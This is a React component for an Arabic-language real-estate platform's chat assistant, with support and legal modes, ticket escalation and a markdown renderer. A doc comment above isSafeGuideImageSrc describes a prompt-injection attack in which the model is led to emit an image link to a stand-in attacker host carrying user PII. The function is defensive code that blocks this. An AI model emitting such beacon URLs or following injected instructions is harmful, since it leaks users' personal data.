"use client";

import { Button } from "@/src/components/ui/Button";
import { Skeleton } from "@/src/components/ui/Skeleton";
import { useToast } from "@/src/components/ui/Toast";
import {
  AttachmentBar,
  type PendingAttachment,
} from "@/src/features/messages/components/AttachmentBar";
import { ChatAttachmentView } from "@/src/features/messages/components/ChatAttachmentView";
import { streamPost } from "@/src/lib/api/browserClient";
import {
  ticketStatusLabels,
  type ChatMessage,
  type TicketStatus,
} from "@/src/lib/api/contracts/support";
import { cn } from "@/src/utils/cn";
import { formatRelativeTime } from "@/src/utils/format";
import {
  AlertTriangle,
  Bot,
  ChevronDown,
  ChevronLeft,
  Headset,
  Maximize2,
  Minimize2,
  PanelLeftClose,
  PanelLeftOpen,
  Plus,
  Scale,
  Send,
  Sparkles,
  UserCheck,
  X,
} from "lucide-react";
import React, { useEffect, useRef, useState } from "react";
import {
  useCreateSupportTicket,
  hasOpenSupportTicket,
  useMyTickets,
  useUserTicketDetail,
  useUserTicketReply,
} from "../hooks/useUserSupport";

const statusTone: Record<string, string> = {
  NEW: "bg-trust-blue-tint text-trust-blue",
  ASSIGNED: "bg-primary-tint text-primary",
  IN_PROGRESS: "bg-pending-tint text-pending",
  WAITING: "bg-background text-muted",
  CLOSED: "bg-success-tint text-success",
  new: "bg-trust-blue-tint text-trust-blue",
  assigned: "bg-primary-tint text-primary",
  in_progress: "bg-pending-tint text-pending",
  waiting: "bg-background text-muted",
  closed: "bg-success-tint text-success",
};

const LEGAL_PROPOSED_MESSAGES = [
  "ما هي الزيادة السنوية القانونية للإيجار بموجب القانون رقم 4؟",
  "ما هي مدة الإخطار القانونية المتفق عليها قبل فسخ العقد؟",
  "ما هي التزامات المؤجر والمستأجر بالنسبة للصيانة والتأمين؟",
  "كيف يتم توثيق شروط فسخ العقد وإخلائه قانونياً؟",
];

function makeUniqueId(prefix: string): string {
  return `${prefix}_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
}

function analyzeSentiment(message: string): { isFrustrated: boolean; score: number } {
  const angryKeywords = [
    "نصابين",
    "سيء جدا",
    "خدمة زبالة",
    "خصمتم",
    "اشتكي",
    "احتيال",
    "مشكلة كبيرة",
    "غير مقبول",
    "أين الدعم",
  ];
  let score = 0;
  for (const word of angryKeywords) {
    if (message.includes(word)) score += 0.35;
  }
  return { isFrustrated: score >= 0.7, score: Math.min(score, 1.0) };
}

/** Memoized Rich Markdown & Table Formatter for 60fps performance */
const FormattedMarkdownText = React.memo(function FormattedMarkdownText({
  text,
}: {
  text: string;
}) {
  const lines = text.split("\n");
  const elements: React.ReactNode[] = [];
  let i = 0;

  while (i < lines.length) {
    const line = lines[i];
    const trimmed = line.trim();

    if (!trimmed) {
      elements.push(<div key={`blank_${i}`} className="h-1" />);
      i++;
      continue;
    }

    // Markdown Table Parser (| header | header |)
    if (trimmed.startsWith("|")) {
      const tableLines: string[] = [];
      while (i < lines.length && lines[i].trim().startsWith("|")) {
        tableLines.push(lines[i].trim());
        i++;
      }

      if (tableLines.length >= 2) {
        const splitRow = (rowStr: string) => {
          let parts = rowStr.split("|");
          if (parts[0] === "") parts = parts.slice(1);
          if (parts[parts.length - 1] === "") parts = parts.slice(0, -1);
          return parts.map((cell) => cell.trim());
        };

        const headers = splitRow(tableLines[0]);
        const hasDivider = tableLines[1].includes("---") || tableLines[1].includes("-");
        const bodyRows = (hasDivider ? tableLines.slice(2) : tableLines.slice(1)).map(splitRow);

        elements.push(
          <div
            key={`table_${i}`}
            className="my-3 overflow-x-auto rounded-card border border-hairline bg-surface shadow-xs"
          >
            <table className="w-full text-start text-caption border-collapse">
              <thead>
                <tr className="border-b border-hairline bg-background/80 font-bold text-ink">
                  {headers.map((h, hIdx) => (
                    <th
                      key={hIdx}
                      className="px-3.5 py-2.5 text-start border-e border-hairline last:border-e-0"
                    >
                      {renderInlineFormatting(h)}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {bodyRows.map((r, rIdx) => (
                  <tr
                    key={rIdx}
                    className="border-b border-hairline/60 last:border-b-0 hover:bg-background/50 transition-colors"
                  >
                    {r.map((cell, cIdx) => (
                      <td
                        key={cIdx}
                        className="px-3.5 py-2 border-e border-hairline/60 last:border-e-0"
                      >
                        {renderInlineFormatting(cell)}
                      </td>
                    ))}
                  </tr>
                ))}
              </tbody>
            </table>
          </div>,
        );
        continue;
      }
    }

    // Horizontal rule (--- or *** or ___)
    if (/^[-*_]{3,}$/.test(trimmed)) {
      elements.push(<hr key={`hr_${i}`} className="my-3 border-t border-hairline/80" />);
      i++;
      continue;
    }

    // Headers
    if (trimmed.startsWith("### ")) {
      elements.push(
        <h4 key={`h4_${i}`} className="mt-1 font-bold text-ink">
          {trimmed.slice(4)}
        </h4>,
      );
      i++;
      continue;
    }
    if (trimmed.startsWith("## ")) {
      elements.push(
        <h3 key={`h3_${i}`} className="mt-1 font-bold text-title text-ink">
          {trimmed.slice(3)}
        </h3>,
      );
      i++;
      continue;
    }

    // Bullet points
    if (trimmed.startsWith("- ") || trimmed.startsWith("* ")) {
      elements.push(
        <div key={`bullet_${i}`} className="flex items-start gap-2 ps-2">
          <span className="mt-2 size-1.5 shrink-0 rounded-full bg-current opacity-70" />
          <span>{renderInlineFormatting(trimmed.slice(2))}</span>
        </div>,
      );
      i++;
      continue;
    }

    // Numbered list
    const numMatch = trimmed.match(/^(\d+)\.\s+(.*)/);
    if (numMatch) {
      elements.push(
        <div key={`num_${i}`} className="flex items-start gap-2 ps-2">
          <span className="font-bold opacity-80">{numMatch[1]}.</span>
          <span>{renderInlineFormatting(numMatch[2])}</span>
        </div>,
      );
      i++;
      continue;
    }

    // Paragraph
    elements.push(<p key={`p_${i}`}>{renderInlineFormatting(line)}</p>);
    i++;
  }

  return <div className="flex flex-col gap-1.5 leading-relaxed">{elements}</div>;
});

/**
 * Only same-origin guide assets may be rendered as images. The support
 * assistant is *told* to emit `![](/images/guides/…png)` (server-side prompt),
 * but its output is model-controlled: without this allowlist an injected
 * instruction could emit `![](https://attacker/?d=<PII>)`, and the browser
 * would auto-GET it — an exfiltration beacon for the user data the support
 * prompt places in context. Reject anything with a scheme, protocol-relative
 * `//host`, or a path escaping `/images/`; those fall back to plain text.
 */
function isSafeGuideImageSrc(url: string): boolean {
  const trimmed = url.trim();
  if (!trimmed.startsWith("/images/")) return false; // must be a rooted same-origin path
  if (trimmed.startsWith("//")) return false; // protocol-relative → cross-origin
  if (/[:\\]/.test(trimmed)) return false; // no scheme (javascript:, data:, http:) or backslashes
  if (trimmed.includes("..")) return false; // no path traversal
  return true;
}

function renderInlineFormatting(str: string) {
  const parts = str.split(/(\*\*.*?\*\*|`.*?`|!\[.*?\]\(.*?\))/g);
  return parts.map((part, i) => {
    if (part.startsWith("**") && part.endsWith("**")) {
      return (
        <strong key={i} className="font-bold">
          {part.slice(2, -2)}
        </strong>
      );
    }
    if (part.startsWith("`") && part.endsWith("`")) {
      return (
        <code key={i} className="rounded bg-black/10 px-1.5 py-0.5 font-mono text-caption text-ink">
          {part.slice(1, -1)}
        </code>
      );
    }
    if (part.startsWith("![") && part.endsWith(")")) {
      const match = part.match(/!\[(.*?)\]\((.*?)\)/);
      if (match) {
        const [, alt, url] = match;
        if (isSafeGuideImageSrc(url)) {
          return (
            <img
              key={i}
              src={url}
              alt={alt}
              className="my-2 max-w-full rounded-card border border-hairline object-contain shadow-sm"
            />
          );
        }
        // Untrusted image URL: render the alt text instead of loading it.
        return <span key={i}>{alt}</span>;
      }
    }
    return part;
  });
}

export type ChatMode = "SUPPORT" | "LEGAL";

export interface UnifiedAiAssistantProps {
  isFullscreen?: boolean;
  onToggleFullscreen?: () => void;
  onClose?: () => void;
}

export function UnifiedAiAssistant({
  isFullscreen,
  onToggleFullscreen,
  onClose,
}: UnifiedAiAssistantProps) {
  const toast = useToast();
  const [mode, setMode] = useState<ChatMode>("SUPPORT");
  const [sidebarOpen, setSidebarOpen] = useState<boolean>(() => {
    if (typeof window === "undefined") return true;
    return window.innerWidth >= 768;
  });
  const [selectedTicketId, setSelectedTicketId] = useState<string | null>(null);

  // SEPARATE chat histories for Support vs Legal agents
  const [supportMessages, setSupportMessages] = useState<ChatMessage[]>([]);
  const [legalMessages, setLegalMessages] = useState<ChatMessage[]>([]);

  // SEPARATE typing state per mode
  const [supportTyping, setSupportTyping] = useState(false);
  const [legalTyping, setLegalTyping] = useState(false);

  const [input, setInput] = useState("");
  const [aiPending, setAiPending] = useState<PendingAttachment | null>(null);
  const [frustrated, setFrustrated] = useState(false);

  // Accordion state
  const [ticketsAccordionOpen, setTicketsAccordionOpen] = useState(true);

  // On phones the sidebar overlays the chat; initial state is derived from window width.

  const scrollRef = useRef<HTMLDivElement>(null);
  const createTicket = useCreateSupportTicket();
  const myTickets = useMyTickets();
  const tickets = myTickets.data?.items ?? [];
  const hasOpenTicket = hasOpenSupportTicket(tickets);
  const escalationLoading = createTicket.isPending || myTickets.isPending || myTickets.isFetching;
  const escalationDisabled = escalationLoading || hasOpenTicket;

  // Active state based on current mode
  const activeMessages = mode === "LEGAL" ? legalMessages : supportMessages;
  const typing = mode === "LEGAL" ? legalTyping : supportTyping;

  const setTyping = (isTyping: boolean) => {
    if (mode === "LEGAL") {
      setLegalTyping(isTyping);
    } else {
      setSupportTyping(isTyping);
    }
  };

  // Instant auto-scroll during streaming
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [activeMessages, typing]);

  // Keyboard Shortcuts: Ctrl+/ (Toggle Sidebar), Alt+L (Legal), Alt+S (Support)
  useEffect(() => {
    function handleShortcuts(e: KeyboardEvent) {
      if ((e.ctrlKey || e.metaKey) && e.key === "/") {
        e.preventDefault();
        setSidebarOpen((o) => !o);
      } else if (e.altKey && e.key.toLowerCase() === "l") {
        e.preventDefault();
        setMode("LEGAL");
        setSelectedTicketId(null);
      } else if (e.altKey && e.key.toLowerCase() === "s") {
        e.preventDefault();
        setMode("SUPPORT");
        setSelectedTicketId(null);
      }
    }
    window.addEventListener("keydown", handleShortcuts);
    return () => window.removeEventListener("keydown", handleShortcuts);
  }, []);

  function handleNewChat() {
    setSelectedTicketId(null);
    if (mode === "LEGAL") {
      setLegalMessages([]);
      setLegalTyping(false);
    } else {
      setSupportMessages([]);
      setSupportTyping(false);
      setFrustrated(false);
    }
    setInput("");
  }

  async function sendMessage(text: string) {
    const trimmed = text.trim();
    // Legal chat can carry an image / voice note with or without text.
    const attachment = mode === "LEGAL" ? aiPending : null;
    if ((!trimmed && !attachment) || typing) return;
    setInput("");
    setAiPending(null);

    // Check sentiment only in support mode
    if (mode === "SUPPORT") {
      const sentiment = analyzeSentiment(trimmed);
      if (sentiment.isFrustrated) {
        setFrustrated(true);
      }
    }

    const replyId = makeUniqueId("ai_reply");
    const clientRequestId = crypto.randomUUID();
    const userMsg: ChatMessage = {
      id: makeUniqueId("user_msg"),
      role: "user",
      content: trimmed,
      attachmentUrl: attachment?.url,
      attachmentType: attachment?.type,
      attachmentName: attachment?.name,
    };

    if (mode === "LEGAL") {
      setLegalMessages((m) => [...m, userMsg]);
    } else {
      setSupportMessages((m) => [...m, userMsg]);
    }
    setTyping(true);

    const endpoint = mode === "LEGAL" ? "legal-chat/stream" : "support/ai-chat/stream";
    let started = false;

    try {
      const done = await streamPost(
        endpoint,
        attachment
          ? {
              message: trimmed,
              attachments: [{ url: attachment.url, type: attachment.type, name: attachment.name }],
            }
          : {
              message: trimmed,
              clientRequestId,
              history:
                mode === "SUPPORT"
                  ? supportMessages.map(({ role, content }) => ({ role, content }))
                  : undefined,
            },
        {
          onToken: (token) => {
            if (!started) {
              started = true;
              setTyping(false);
              const placeholder: ChatMessage = { id: replyId, role: "assistant", content: "" };
              if (mode === "LEGAL") {
                setLegalMessages((m) => [...m, placeholder]);
              } else {
                setSupportMessages((m) => [...m, placeholder]);
              }
            }
            if (mode === "LEGAL") {
              setLegalMessages((m) =>
                m.map((msg) =>
                  msg.id === replyId ? { ...msg, content: msg.content + token } : msg,
                ),
              );
            } else {
              setSupportMessages((m) =>
                m.map((msg) =>
                  msg.id === replyId ? { ...msg, content: msg.content + token } : msg,
                ),
              );
            }
          },
        },
      );
      if (mode === "LEGAL") {
        setLegalMessages((m) =>
          m.map((msg) => (msg.id === replyId ? { ...msg, declined: done.declined } : msg)),
        );
      } else {
        setSupportMessages((m) =>
          m.map((msg) =>
            msg.id === replyId
              ? { ...msg, declined: done.declined, suggestedGuide: done.suggestedGuide }
              : msg,
          ),
        );
      }
    } catch {
      const fallbackMsg: ChatMessage = {
        id: replyId,
        role: "assistant",
        content:
          mode === "LEGAL"
            ? "أنا المستشار القانوني لمنصة PropMatch. يمكنني مساعدتك في استفسارات قانون الإيجار المصري رقم 4 لسنة 1996."
            : "أنا المساعد الآلي لخدمة العملاء. إذا كنت ترغب في التحدث مع موظف دعم فني، انقر على زر التحويل أدناه.",
      };
      if (mode === "LEGAL") {
        setLegalMessages((m) => [...m, fallbackMsg]);
      } else {
        setSupportMessages((m) => [...m, fallbackMsg]);
      }
    } finally {
      setTyping(false);
    }
  }

  function handleEscalateToHuman() {
    if (escalationDisabled) return;
    const lastUserMsg =
      [...supportMessages].reverse().find((m) => m.role === "user")?.content ||
      "استفسار خدمة العملاء";
    createTicket.mutate(
      {
        subject: lastUserMsg.slice(0, 50),
        initialMessage: lastUserMsg,
      },
      {
        onSuccess: (ticket) => {
          toast("success", "تم إنشاء التذكرة وتحويلك لموظف الدعم الفني");
          setFrustrated(false);
          setSelectedTicketId(ticket.id);
        },
        onError: () => toast("error", "تعذر إنشاء تذكرة الدعم. حاول مرة أخرى."),
      },
    );
  }

  return (
    <div
      className={cn(
        "relative mx-auto flex w-full overflow-hidden rounded-card border border-hairline bg-surface shadow-card",
        isFullscreen
          ? "h-full max-w-none rounded-none border-none shadow-none"
          : "h-[calc(100dvh-5rem)] max-w-7xl",
      )}
    >
      {/* On mobile the sidebar overlays the chat — a backdrop closes it. */}
      {sidebarOpen && (
        <button
          type="button"
          aria-label="إغلاق القائمة"
          onClick={() => setSidebarOpen(false)}
          className="absolute inset-0 z-20 bg-ink/30 md:hidden"
        />
      )}
      {/* ChatGPT / Gemini Style Accordion Sidebar */}
      <div
        className={cn(
          "flex flex-col border-e border-hairline bg-background transition-[width] duration-200",
          "max-md:absolute max-md:inset-y-0 max-md:inset-s-0 max-md:z-30 max-md:shadow-xl",
          sidebarOpen ? "w-72 max-w-[85%]" : "w-0 overflow-hidden border-none",
        )}
      >
        {/* Sidebar Header & New Chat */}
        <div className="flex items-center justify-between border-b border-hairline p-3">
          <Button
            variant="secondary"
            size="sm"
            onClick={handleNewChat}
            className="w-full justify-start gap-2"
          >
            <Plus className="size-4" />
            <span>محادثة جديدة</span>
          </Button>
        </div>

        {/* Sidebar Accordions */}
        <div className="flex-1 overflow-y-auto p-3">
          {/* Tile 1: Support Tickets Accordion */}
          <div className="flex flex-col gap-1">
            <button
              onClick={() => setTicketsAccordionOpen((o) => !o)}
              className="flex w-full items-center justify-between rounded-control px-2 py-2 text-caption font-bold text-ink hover:bg-surface"
            >
              <div className="flex items-center gap-2">
                <Headset className="size-4 text-primary" />
                <span>تذاكر الدعم الفني ({tickets.length})</span>
              </div>
              <ChevronDown
                className={cn("size-4 transition-transform", ticketsAccordionOpen && "rotate-180")}
              />
            </button>

            {ticketsAccordionOpen && (
              <div className="mt-1 flex flex-col gap-1 pe-1">
                {tickets.length === 0 ? (
                  <span className="px-3 text-caption text-muted">لا توجد تذاكر مفتوحة</span>
                ) : (
                  tickets.map((t) => (
                    <button
                      key={t.id}
                      onClick={() => setSelectedTicketId(t.id)}
                      className={cn(
                        "flex items-center justify-between gap-2 rounded-control px-3 py-2 text-start text-caption transition-colors",
                        selectedTicketId === t.id
                          ? "bg-primary-tint font-bold text-primary"
                          : "text-body-text hover:bg-surface",
                      )}
                    >
                      <div className="flex items-center gap-2 overflow-hidden">
                        <span
                          className={cn("size-2 shrink-0 rounded-full", statusTone[t.status])}
                        />
                        <span className="truncate">{t.subject}</span>
                      </div>
                      <ChevronLeft className="size-3 shrink-0 text-muted" />
                    </button>
                  ))
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Main Wide Chat Panel */}
      <div className="flex flex-1 flex-col overflow-hidden min-h-0">
        {/* SINGLE UNIFIED TOP HEADER BAR (Eliminates double header stacked height) */}
        <div className="flex items-center justify-between border-b border-hairline px-4 py-2 bg-background">
          {/* Start Side: Sidebar toggle + Brand + Mode Title + Legal Disclaimer */}
          <div className="flex items-center gap-2.5 overflow-hidden">
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setSidebarOpen((o) => !o)}
              title={sidebarOpen ? "إخفاء القائمة" : "عرض القائمة"}
              className="p-1.5"
            >
              {sidebarOpen ? (
                <PanelLeftClose className="size-4" />
              ) : (
                <PanelLeftOpen className="size-4" />
              )}
            </Button>

            <div className="flex items-center gap-1.5 text-primary font-bold text-caption shrink-0">
              <Sparkles className="size-3.5 text-accent-gold" />
              <span className="hidden md:inline">PropMatch AI</span>
            </div>

            <span className="text-muted text-caption shrink-0">/</span>

            <span className="text-small font-bold text-ink truncate">
              {mode === "LEGAL" ? "المستشار القانوني العقاري" : "خدمة العملاء والدعم الفني"}
            </span>

            {/* Legal Disclaimer Badge Beside Title */}
            {mode === "LEGAL" && (
              <span className="hidden xl:inline-flex items-center gap-1.5 rounded-pill bg-primary-tint/70 px-2.5 py-0.5 text-[11px] text-primary truncate border border-primary/20">
                <Scale className="size-3 shrink-0 text-primary" />
                <span className="truncate">استرشادي طبقاً للقانون رقم 4 لسنة 1996</span>
              </span>
            )}
          </div>

          {/* End Side: Return button + Maximize/Minimize button + Close button */}
          <div className="flex items-center gap-1 shrink-0">
            {selectedTicketId && (
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setSelectedTicketId(null)}
                className="text-caption"
              >
                العودة للمساعد
              </Button>
            )}

            {/* Maximize / Minimize Button */}
            {onToggleFullscreen && (
              <button
                type="button"
                onClick={onToggleFullscreen}
                className="flex size-7 items-center justify-center rounded-full text-muted hover:bg-hairline hover:text-ink transition-colors"
                aria-label={isFullscreen ? "تصغير النافذة" : "تكبير الشاشة الكاملة"}
                title={isFullscreen ? "تصغير النافذة" : "تكبير الشاشة الكاملة"}
              >
                {isFullscreen ? <Minimize2 className="size-4" /> : <Maximize2 className="size-4" />}
              </button>
            )}

            {/* Close [X] Button directly beside Maximize/Minimize */}
            {onClose && (
              <button
                type="button"
                onClick={onClose}
                className="flex size-7 items-center justify-center rounded-full text-muted hover:bg-hairline hover:text-ink transition-colors"
                aria-label="إغلاق"
                title="إغلاق"
              >
                <X className="size-4" />
              </button>
            )}
          </div>
        </div>

        {/* Content Pane */}
        {selectedTicketId ? (
          <UserTicketThread id={selectedTicketId} onBack={() => setSelectedTicketId(null)} />
        ) : (
          <div className="flex flex-1 flex-col gap-3 overflow-hidden p-5 pb-5 min-h-0">
            {/* Frustration Alert in Support Mode */}
            {mode === "SUPPORT" && frustrated && (
              <div className="flex items-center justify-between gap-3 rounded-card border border-error/30 bg-error-tint p-3.5 text-error">
                <div className="flex items-center gap-2 text-small font-bold">
                  <AlertTriangle className="size-4 shrink-0" />
                  يبدو أنك تواجه مشكلة هامة! يمكنك التحويل مباشرة لموظف دعم فني.
                </div>
                <Button
                  size="sm"
                  variant="primary"
                  loading={escalationLoading}
                  disabled={escalationDisabled}
                  onClick={handleEscalateToHuman}
                >
                  {hasOpenTicket ? "لديك تذكرة مفتوحة" : "تحدث مع موظف"}
                </Button>
              </div>
            )}

            {/* Messages Thread with Wide Bubble Layout & Fast Rendering */}
            <div
              ref={scrollRef}
              className="flex flex-1 flex-col gap-4 overflow-y-auto rounded-card border border-hairline bg-surface p-5 min-h-0"
            >
              {activeMessages.length === 0 && (
                <div className="flex flex-1 flex-col items-center justify-center gap-4 text-center py-8">
                  {mode === "LEGAL" ? (
                    <Scale className="size-14 text-primary" />
                  ) : (
                    <Bot className="size-14 text-primary" />
                  )}
                  <div>
                    <h3 className="text-title font-bold text-ink">
                      {mode === "LEGAL"
                        ? "مرحباً بك في المستشار القانوني العقاري"
                        : "مرحباً بك في خدمة عملاء PropMatch"}
                    </h3>
                    <p className="mt-1.5 text-body text-muted max-w-lg">
                      {mode === "LEGAL"
                        ? "اسأل عن قوانين الإيجارات، مدد العقود، والزيادات القانونية بموجب القانون رقم 4"
                        : "اسأل المساعد الذكي عن استخدام المنصة، الاشتراكات، أو متابعة الطلبات"}
                    </p>
                  </div>

                  {/* Proposed Suggested Messages in Legal Agent Mode */}
                  {mode === "LEGAL" && (
                    <div className="mt-6 flex max-w-2xl flex-wrap justify-center gap-2.5">
                      {LEGAL_PROPOSED_MESSAGES.map((prompt, idx) => (
                        <button
                          key={idx}
                          type="button"
                          onClick={() => sendMessage(prompt)}
                          className="flex items-center gap-2 rounded-pill border border-primary/20 bg-primary-tint/40 px-4 py-2 text-caption font-semibold text-primary transition-all hover:bg-primary-tint hover:border-primary"
                        >
                          <Sparkles className="size-3.5 text-accent-gold" />
                          <span>{prompt}</span>
                        </button>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {activeMessages.map((m) => (
                <div
                  key={m.id}
                  className={cn("flex", m.role === "user" ? "justify-start" : "justify-end")}
                >
                  <div
                    className={cn(
                      "flex max-w-[92%] flex-col gap-2 rounded-card px-5 py-3 text-body leading-relaxed shadow-xs sm:max-w-[85%]",
                      m.role === "user"
                        ? "bg-primary text-white"
                        : "bg-background text-ink border border-hairline",
                    )}
                  >
                    {m.attachmentUrl && m.attachmentType && (
                      <ChatAttachmentView
                        url={m.attachmentUrl}
                        type={m.attachmentType}
                        name={m.attachmentName}
                      />
                    )}
                    {m.role === "assistant" ? (
                      <FormattedMarkdownText text={m.content} />
                    ) : (
                      m.content && <span>{m.content}</span>
                    )}
                    {m.role === "assistant" && m.suggestedGuide && m.suggestedGuide.length > 0 && (
                      <div className="mt-2.5 flex flex-wrap gap-2 pt-2 border-t border-hairline/80">
                        {m.suggestedGuide.map((guide) => {
                          if (guide === "KYC_GUIDE") {
                            return (
                              <Button
                                key={guide}
                                variant="secondary"
                                size="sm"
                                onClick={() => (window.location.href = "/verify")}
                                className="text-caption font-bold"
                              >
                                💳 بدء عملية التوثيق الإلكتروني
                              </Button>
                            );
                          }
                          if (guide === "PROPERTY_GUIDE") {
                            return (
                              <Button
                                key={guide}
                                variant="secondary"
                                size="sm"
                                onClick={() => (window.location.href = "/landlord/properties/new")}
                                className="text-caption font-bold"
                              >
                                🏠 إضافة عقار جديد
                              </Button>
                            );
                          }
                          if (guide === "REQUEST_GUIDE") {
                            return (
                              <Button
                                key={guide}
                                variant="secondary"
                                size="sm"
                                onClick={() => (window.location.href = "/tenant/requests/new")}
                                className="text-caption font-bold"
                              >
                                📋 نشر طلب سكن جديد
                              </Button>
                            );
                          }
                          return null;
                        })}
                      </div>
                    )}
                  </div>
                </div>
              ))}

              {typing && (
                <div className="flex justify-end">
                  <div className="flex gap-1.5 rounded-card bg-background px-5 py-3.5 border border-hairline">
                    {[0, 1, 2].map((i) => (
                      <span
                        key={i}
                        className="size-2 animate-bounce rounded-full bg-muted"
                        style={{ animationDelay: `${i * 0.15}s` }}
                      />
                    ))}
                  </div>
                </div>
              )}
            </div>

            {/* Bottom Form Input Row with Integrated Mode Switcher Inside the Input Field Box */}
            <div className="flex flex-col gap-2">
              {mode === "SUPPORT" && (
                <div className="flex items-center justify-end px-1">
                  <Button
                    type="button"
                    size="sm"
                    variant="ghost"
                    loading={escalationLoading}
                    disabled={escalationDisabled}
                    onClick={handleEscalateToHuman}
                    className="text-caption font-bold"
                  >
                    <UserCheck className="size-3.5" />
                    {hasOpenTicket ? "لديك تذكرة دعم مفتوحة" : "تحويل لموظف الدعم الفني"}
                  </Button>
                </div>
              )}

              {mode === "LEGAL" && (
                <div className="px-1">
                  <AttachmentBar pending={aiPending} onChange={setAiPending} disabled={typing} />
                </div>
              )}

              <form
                onSubmit={(e) => {
                  e.preventDefault();
                  sendMessage(input);
                }}
                className="flex items-center gap-2 rounded-pill border border-hairline bg-surface p-1.5 pe-2 focus-within:border-primary focus-within:ring-2 focus-within:ring-primary/20 shadow-sm"
              >
                {/* Embedded Mode Switcher Buttons inside the Textfield */}

                <input
                  value={input}
                  onChange={(e) => setInput(e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && !e.shiftKey) {
                      e.preventDefault();
                      if (input.trim() && !typing) {
                        sendMessage(input);
                      }
                    }
                  }}
                  placeholder={
                    mode === "LEGAL" ? "اكتب سؤالك القانوني هنا…" : "اكتب استفسارك للمساعد الذكي…"
                  }
                  className="flex-1 border-0 bg-transparent px-3 py-2 text-body text-ink focus:outline-none focus:ring-0 placeholder:text-muted"
                />
                <div className="flex shrink-0 rounded-pill bg-background border border-hairline p-0.5">
                  <button
                    type="button"
                    onClick={() => {
                      setMode("SUPPORT");
                      setSelectedTicketId(null);
                    }}
                    className={cn(
                      "flex items-center gap-1 rounded-pill px-3 py-1 text-caption font-bold transition-all",
                      mode === "SUPPORT"
                        ? "bg-primary text-white shadow-xs"
                        : "text-muted hover:text-ink",
                    )}
                  >
                    <Headset className="size-3.5" />
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      setMode("LEGAL");
                      setSelectedTicketId(null);
                    }}
                    className={cn(
                      "flex items-center gap-1 rounded-pill px-3 py-1 text-caption font-bold transition-all",
                      mode === "LEGAL"
                        ? "bg-primary text-white shadow-xs"
                        : "text-muted hover:text-ink",
                    )}
                  >
                    <Scale className="size-3.5" />
                  </button>
                </div>

                <button
                  type="submit"
                  disabled={!input.trim() || typing}
                  className="flex size-10 shrink-0 items-center justify-center rounded-full bg-primary text-white disabled:opacity-50 transition-transform active:scale-95 shadow-xs"
                  aria-label="إرسال"
                >
                  <Send className="size-4 rtl:-scale-x-100" />
                </button>
              </form>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function UserTicketThread({ id, onBack }: { id: string; onBack: () => void }) {
  const toast = useToast();
  const { data: ticket, isLoading, isError } = useUserTicketDetail(id);
  const reply = useUserTicketReply(id);
  const [text, setText] = useState("");
  const [pending, setPending] = useState<PendingAttachment | null>(null);

  if (isLoading) return <Skeleton className="h-64 w-full" />;
  if (isError || !ticket) return <div className="p-4">تعذر تحميل التذكرة.</div>;

  const canSend = Boolean(text.trim() || pending);

  function handleSubmit(e?: React.FormEvent) {
    e?.preventDefault();
    if (!canSend || reply.isPending) return;
    reply.mutate(
      {
        content: text.trim() || undefined,
        attachmentUrl: pending?.url,
        attachmentType: pending?.type,
        attachmentName: pending?.name,
        attachmentDurationMs: pending?.durationMs,
      },
      {
        onSuccess: () => {
          setText("");
          setPending(null);
          toast("success", "تم إرسال ردك لموظف الدعم");
        },
      },
    );
  }

  return (
    <div className="flex flex-1 flex-col gap-3 p-5 pb-6 min-h-0">
      <div className="flex items-center justify-between border-b border-hairline pb-2">
        <Button variant="ghost" size="sm" onClick={onBack}>
          ← العودة للمحاورات
        </Button>
        <span
          className={cn(
            "rounded-pill px-2.5 py-0.5 text-caption font-bold",
            statusTone[ticket.status as TicketStatus],
          )}
        >
          {ticketStatusLabels[ticket.status as TicketStatus]}
        </span>
      </div>

      <div className="rounded-card border border-hairline bg-surface p-3.5">
        <h2 className="text-body font-bold text-ink">{ticket.subject}</h2>
      </div>

      <div className="flex flex-1 flex-col gap-3 overflow-y-auto rounded-card border border-hairline bg-surface p-4 min-h-0">
        {ticket.messages.map((m) => {
          const authorVal = String(m.authorType || m.author || "").toLowerCase();
          const isUser = authorVal === "user";
          const timestamp = m.createdAt || m.at || new Date().toISOString();

          return (
            <div key={m.id} className={cn("flex", isUser ? "justify-start" : "justify-end")}>
              <div
                className={cn(
                  "flex max-w-[85%] flex-col gap-1",
                  isUser ? "items-start" : "items-end",
                )}
              >
                <span className="text-caption text-muted">
                  {m.authorName} · {formatRelativeTime(timestamp)}
                </span>
                <div
                  className={cn(
                    "flex flex-col gap-2 rounded-card px-4 py-2.5 text-body leading-relaxed",
                    isUser
                      ? "bg-primary text-white"
                      : "bg-background text-ink border border-hairline",
                  )}
                >
                  {m.attachmentUrl && m.attachmentType && (
                    <ChatAttachmentView
                      url={m.attachmentUrl}
                      type={m.attachmentType}
                      name={m.attachmentName}
                    />
                  )}
                  {m.content && <FormattedMarkdownText text={m.content} />}
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {ticket.status !== "closed" ? (
        <form onSubmit={handleSubmit} className="flex flex-col gap-2">
          <div className="flex gap-2">
            <input
              value={text}
              onChange={(e) => setText(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter" && !e.shiftKey) {
                  e.preventDefault();
                  handleSubmit();
                } else if (e.key === "Escape") {
                  onBack();
                }
              }}
              placeholder="اكتب رداً لموظف الدعم…"
              className="flex-1 rounded-pill border border-hairline bg-surface px-5 py-2.5 text-body focus:border-primary focus:outline-none"
            />
            <Button type="submit" loading={reply.isPending} disabled={!canSend}>
              إرسال
            </Button>
          </div>
          <AttachmentBar pending={pending} onChange={setPending} disabled={reply.isPending} />
        </form>
      ) : (
        <div className="rounded-card bg-background p-3 text-center text-caption text-muted">
          تم إغلاق هذه التذكرة.
        </div>
      )}
    </div>
  );
}
